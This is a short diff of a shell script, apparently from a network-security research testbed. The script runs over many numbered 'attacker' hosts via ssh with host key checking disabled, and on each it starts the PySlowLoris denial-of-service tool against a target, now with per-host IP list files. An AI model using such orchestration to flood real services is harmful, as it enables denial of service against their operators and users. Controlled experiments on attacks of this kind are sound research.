@@ -12,7 +12,7 @@ j=1
 
 while [ $j -le $2 ] ; do
 	      echo "Starting attack on attacker$j $2 "
-	      ssh -o StrictHostKeyChecking=no  attacker$j.$EXP.leader "cd /users/rajat19/PySlowLoris/ ; sudo python src/main.py $1" &
+	      ssh -o StrictHostKeyChecking=no  attacker$j.$EXP.leader "cd /proj/Leader/attacks/PySlowLoris/ ; sudo python src/main.py $1 -cf attackerIPs/1000/IPs_for_att_$j &" &
               j=$(($j+1))
 done
 sleep $DURATION
